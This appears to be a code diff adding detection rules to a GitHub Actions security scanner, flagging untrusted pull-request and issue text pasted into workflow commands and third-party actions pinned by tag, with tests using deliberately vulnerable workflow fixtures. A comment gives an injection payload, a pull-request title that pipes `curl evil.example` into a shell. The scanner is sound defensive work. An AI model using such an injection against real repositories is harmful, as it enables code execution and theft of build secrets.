@@ -35,6 +35,40 @@ pub const FORK_SECRETS: &str = "config.workflow-secrets-with-fork-code";
 pub const CHECKOUT_TOKEN: &str = "config.workflow-checkout-keeps-token";
 pub const TOKEN_PERMISSIONS: &str = "config.workflow-token-permissions";
 pub const ALL_SECRETS: &str = "config.workflow-hands-out-all-secrets";
+pub const UNTRUSTED_IN_RUN: &str = "config.workflow-untrusted-text-in-run";
+pub const ACTION_NOT_PINNED: &str = "config.workflow-action-not-pinned";
+
+/// Text a stranger writes and a workflow can read: a pull request's, issue's, comment's, or
+/// discussion's title and body, a branch name, a commit message, and its author's name and email.
+/// GitHub's own list of untrusted input ("Security hardening for GitHub Actions"). Compared with the
+/// expression lowered and its spaces taken out.
+const UNTRUSTED_TEXT: &[&str] = &[
+    "github.event.pull_request.title",
+    "github.event.pull_request.body",
+    "github.event.pull_request.head.ref",
+    "github.event.pull_request.head.label",
+    "github.event.pull_request.head.repo.default_branch",
+    "github.head_ref",
+    "github.event.issue.title",
+    "github.event.issue.body",
+    "github.event.comment.body",
+    "github.event.review.body",
+    "github.event.review_comment.body",
+    "github.event.discussion.title",
+    "github.event.discussion.body",
+    "github.event.head_commit.message",
+    "github.event.head_commit.author.email",
+    "github.event.head_commit.author.name",
+    "github.event.commits",
+    "github.event.workflow_run.head_branch",
+    "github.event.workflow_run.head_commit.message",
+    "github.event.workflow_run.head_commit.author",
+    "github.event.pages",
+];
+
+/// Triggers whose runs a stranger can start and that run with the repository's secrets and a token
+/// that can write: the privileged triggers, and an issue or a discussion opened by anyone.
+const SECRET_TRIGGERS: &[&str] = &["issues", "discussion"];
 
 /// Pipelines of other kinds. While one of these is present, a clean set of GitHub workflows is not a
 /// clean pipeline, because part of it was never read.
@@ -607,6 +641,8 @@ pub fn check(app_dir: &Path) -> WorkflowReport {
         }
         token_permissions(&workflow, name, &mut report);
         all_secrets(&workflow, name, &mut report);
+        untrusted_in_run(&workflow, name, &on, &mut report);
+        actions_not_pinned(&workflow, name, &mut report);
     }
 
     let other: Vec<&str> = OTHER_PIPELINES
@@ -852,6 +888,177 @@ fn all_secrets(workflow: &Value, name: &str, report: &mut WorkflowReport) {
             "Give each secret only to the step that uses it, in that step's own `env:` or `with:`. \
              Pass a reusable workflow the secrets it needs by name instead of `secrets: inherit`, \
              and never pass `toJSON(secrets)`."
+                .into(),
+        ],
+    ));
+}
+
+/// The untrusted expressions inside a script's text: each `${{ ... }}` naming text a stranger writes.
+fn untrusted_expressions(script: &str) -> Vec<String> {
+    let mut found = Vec::new();
+    let mut rest = script;
+    while let Some(start) = rest.find("${{") {
+        let after = &rest[start + 3..];
+        let Some(end) = after.find("}}") else { break };
+        let inside = squashed(&after[..end]);
+        if UNTRUSTED_TEXT.iter().any(|u| inside.contains(u)) && !found.contains(&inside) {
+            found.push(inside);
+        }
+        rest = &after[end + 2..];
+    }
+    found
+}
+
+/// A `run:` line, or `actions/github-script`'s `script:`, with text a stranger writes pasted into it.
+///
+/// GitHub fills in `${{ ... }}` before the shell or the script reads the line, so a pull request
+/// titled `a"; curl evil.example | sh; echo "` runs that command. Only ever a finding. Cites AC.12.1
+/// only when a trigger that runs with the repository's secrets on a stranger's behalf starts the
+/// workflow; elsewhere it cites nothing, since the job has nothing of the repository's to give away.
+fn untrusted_in_run(workflow: &Value, name: &str, on: &[String], report: &mut WorkflowReport) {
+    let mut hits: Vec<(usize, String)> = Vec::new();
+    for (_, job) in jobs(workflow) {
+        for step in steps(job) {
+            let script = step.get("run").or_else(|| {
+                step.get("uses")
+                    .and_then(Value::text)
+                    .filter(|u| {
+                        u.trim()
+                            .to_ascii_lowercase()
+                            .starts_with("actions/github-script@")
+                    })
+                    .and_then(|_| step.get("with")?.get("script"))
+            });
+            let Some(script) = script else { continue };
+            let Some(text) = script.text() else { continue };
+            for expression in untrusted_expressions(text) {
+                hits.push((script.line().unwrap_or(1), expression));
+            }
+        }
+    }
+    let Some(&(line, _)) = hits.first() else {
+        return;
+    };
+    let privileged: Vec<&str> = PRIVILEGED_TRIGGERS
+        .iter()
+        .chain(SECRET_TRIGGERS)
+        .copied()
+        .filter(|t| on.iter().any(|o| o == t))
+        .collect();
+    let named: Vec<String> = hits
+        .iter()
+        .map(|(line, e)| format!("`${{{{ {e} }}}}` (line {line})"))
+        .collect();
+    report.findings.push(finding(
+        UNTRUSTED_IN_RUN,
+        "Text a stranger writes is pasted into a workflow's commands".into(),
+        if privileged.is_empty() {
+            Severity::Medium
+        } else {
+            Severity::Critical
+        },
+        at(name, line),
+        if privileged.is_empty() {
+            &[]
+        } else {
+            &["AC.12.1"]
+        },
+        &["CWE-78"],
+        [
+            format!(
+                "In `{name}`, {} {} put straight into a script, where it is read as commands{}.",
+                named.join(", "),
+                if named.len() == 1 { "is" } else { "are" },
+                if privileged.is_empty() {
+                    String::new()
+                } else {
+                    format!(
+                        ", and the workflow is started by `{}`, which runs with this repository's \
+                         secrets and a token that can write",
+                        privileged.join("` and `")
+                    )
+                }
+            ),
+            "GitHub fills in the expression before the script runs, so whoever writes that text \
+             (a pull request's title, a branch name, an issue) can end it with a quote and add \
+             commands of their own, which run on the build machine with whatever the job holds."
+                .into(),
+            "Pass the text in through `env:` (`TITLE: ${{ github.event.pull_request.title }}`) \
+             and use it in the script as a quoted variable (`\"$TITLE\"`), so it is only ever \
+             read as text."
+                .into(),
+        ],
+    ));
+}
+
+/// Whether `uses:` names a commit: 40 hexadecimal characters after the `@`.
+fn pinned_to_commit(reference: &str) -> bool {
+    reference.len() == 40 && reference.chars().all(|c| c.is_ascii_hexdigit())
+}
+
+/// Actions from outside GitHub's own organizations named by a tag or a branch rather than a commit.
+///
+/// A tag can be moved to other code at any time by whoever controls the action, and that code then
+/// runs in every job that uses it, with whatever the job holds. Evidence about no requirement here:
+/// none asks for commit pinning, so it is reported as good practice, as the token's permissions are.
+fn actions_not_pinned(workflow: &Value, name: &str, report: &mut WorkflowReport) {
+    let mut loose: Vec<(usize, String)> = Vec::new();
+    let mut consider = |uses: &Value| {
+        let Some(text) = uses.text() else { return };
+        let text = text.trim();
+        // A container image named by its digest is pinned in its own way; `docker://alpine@sha256:...`
+        // has an `@` too. A local action (`./path`) has none, and stops at the split below.
+        if text.starts_with("docker://") {
+            return;
+        }
+        let Some((action, reference)) = text.split_once('@') else {
+            return;
+        };
+        let owner = action.split('/').next().unwrap_or("").to_ascii_lowercase();
+        if matches!(owner.as_str(), "actions" | "github") || pinned_to_commit(reference) {
+            return;
+        }
+        if !loose.iter().any(|(_, t)| t == text) {
+            loose.push((uses.line().unwrap_or(1), text.to_owned()));
+        }
+    };
+    for (_, job) in jobs(workflow) {
+        if let Some(uses) = job.get("uses") {
+            consider(uses);
+        }
+        for step in steps(job) {
+            if let Some(uses) = step.get("uses") {
+                consider(uses);
+            }
+        }
+    }
+    let Some(&(line, _)) = loose.first() else {
+        return;
+    };
+    report.findings.push(finding(
+        ACTION_NOT_PINNED,
+        "A workflow uses someone else's action by a name that can be moved".into(),
+        Severity::Low,
+        at(name, line),
+        &[],
+        &["CWE-829"],
+        [
+            format!(
+                "`{name}` uses {} by a tag or a branch rather than a commit.",
+                loose
+                    .iter()
+                    .map(|(line, t)| format!("`{t}` (line {line})"))
+                    .collect::<Vec<_>>()
+                    .join(", ")
+            ),
+            "Whoever controls that action can point the tag at different code, and the next run \
+             uses it with whatever the job holds, its token and secrets included. It has happened: \
+             in March 2025 `tj-actions/changed-files` had its tags moved to code that printed \
+             secrets into build logs."
+                .into(),
+            "Name each action by its full commit, with the version as a comment: \
+             `uses: owner/action@<40-character commit> # v4.1.0`. A tool such as Dependabot can keep \
+             the commits current."
                 .into(),
         ],
     ));
@@ -1520,5 +1727,139 @@ jobs:
             "{:?}",
             report.passed
         );
+    }
+
+    /// The findings of one rule in one workflow file.
+    fn of_rule(name: &str, rule: &str, workflow: &str) -> Vec<Finding> {
+        let report = run(name, &[("ci.yml", workflow)], &[]);
+        assert!(
+            !report
+                .not_assessed
+                .iter()
+                .any(|(_, why)| why.contains("could not read")),
+            "the fixture must be read: {:?}",
+            report.not_assessed
+        );
+        report
+            .findings
+            .into_iter()
+            .filter(|f| f.rule_id == rule)
+            .collect()
+    }
+
+    fn titled(trigger: &str, run_line: &str) -> String {
+        format!(
+            "on: {trigger}\npermissions:\n  contents: read\njobs:\n  greet:\n    runs-on: ubuntu-latest\n    steps:\n      - run: {run_line}\n"
+        )
+    }
+
+    #[test]
+    fn a_strangers_text_pasted_into_a_run_line_is_found_and_cites_only_where_it_runs_with_secrets()
+    {
+        let privileged = of_rule(
+            "inject-target",
+            UNTRUSTED_IN_RUN,
+            &titled(
+                "pull_request_target",
+                "echo \"Thanks for ${{ github.event.pull_request.title }}\"",
+            ),
+        );
+        assert_eq!(privileged.len(), 1, "{privileged:?}");
+        assert_eq!(privileged[0].severity, Severity::Critical);
+        assert_eq!(privileged[0].requirement_ids, vec!["AC.12.1"]);
+        assert_eq!(privileged[0].location.line, 8);
+        assert!(
+            privileged[0]
+                .description
+                .contains("github.event.pull_request.title"),
+            "{}",
+            privileged[0].description
+        );
+
+        let issue = of_rule(
+            "inject-issue",
+            UNTRUSTED_IN_RUN,
+            &titled("issues", "echo ${{ github.event.issue.body }}"),
+        );
+        assert_eq!(issue[0].requirement_ids, vec!["AC.12.1"]);
+
+        // A fork's pull request gets no secrets and a read-only token: still found, citing nothing.
+        let plain = of_rule(
+            "inject-plain",
+            UNTRUSTED_IN_RUN,
+            &titled("pull_request", "git checkout ${{github.head_ref}}"),
+        );
+        assert_eq!(plain.len(), 1, "however it is spaced: {plain:?}");
+        assert_eq!(plain[0].severity, Severity::Medium);
+        assert!(plain[0].requirement_ids.is_empty());
+
+        let script = of_rule(
+            "inject-script",
+            UNTRUSTED_IN_RUN,
+            "on: issue_comment\npermissions:\n  contents: read\njobs:\n  reply:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/github-script@v7\n        with:\n          script: |\n            console.log(\"${{ github.event.comment.body }}\")\n",
+        );
+        assert_eq!(script.len(), 1, "github-script's script: {script:?}");
+    }
+
+    #[test]
+    fn untrusted_text_passed_through_env_or_safe_fields_is_not_found() {
+        for (name, workflow) in [
+            (
+                "env",
+                "on: pull_request_target\npermissions:\n  contents: read\njobs:\n  greet:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Thanks for $TITLE\"\n        env:\n          TITLE: ${{ github.event.pull_request.title }}\n",
+            ),
+            (
+                "number",
+                &titled(
+                    "pull_request_target",
+                    "echo ${{ github.event.pull_request.number }}",
+                ),
+            ),
+            ("sha", &titled("pull_request", "echo ${{ github.sha }}")),
+        ] {
+            assert!(
+                of_rule(name, UNTRUSTED_IN_RUN, workflow).is_empty(),
+                "{name} was reported"
+            );
+        }
+    }
+
+    #[test]
+    fn someone_elses_action_named_by_a_tag_is_found_and_cites_nothing() {
+        let commit = "8f4b7f84864484a7bf31766abe9204da3cbe65b3";
+        let digest = "4bcff63911fcb4448bd4fdacec207030997caf25e9bea4045fa6c8c44de311d1";
+        let workflow = format!(
+            "on: push\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          persist-credentials: false\n      - uses: github/codeql-action/init@v3\n      - uses: tj-actions/changed-files@v45\n      - uses: astral-sh/setup-uv@{commit} # v6\n      - uses: ./.github/actions/local\n      - uses: docker://alpine@sha256:{digest}\n  release:\n    uses: someorg/workflows/.github/workflows/release.yml@main\n"
+        );
+        let found = of_rule("pin", ACTION_NOT_PINNED, &workflow);
+        assert_eq!(found.len(), 1, "one finding per file: {found:?}");
+        let f = &found[0];
+        assert!(f.requirement_ids.is_empty());
+        assert_eq!(f.severity, Severity::Low);
+        assert_eq!(f.location.line, 12);
+        assert!(
+            f.description.contains("tj-actions/changed-files@v45"),
+            "{}",
+            f.description
+        );
+        assert!(
+            f.description
+                .contains("someorg/workflows/.github/workflows/release.yml@main"),
+            "{}",
+            f.description
+        );
+        for left_out in [
+            "actions/checkout",
+            "github/codeql-action",
+            "astral-sh",
+            "./.github",
+            "docker://",
+        ] {
+            assert!(
+                !f.description.contains(left_out),
+                "{left_out}: {}",
+                f.description
+            );
+        }
     }
 }
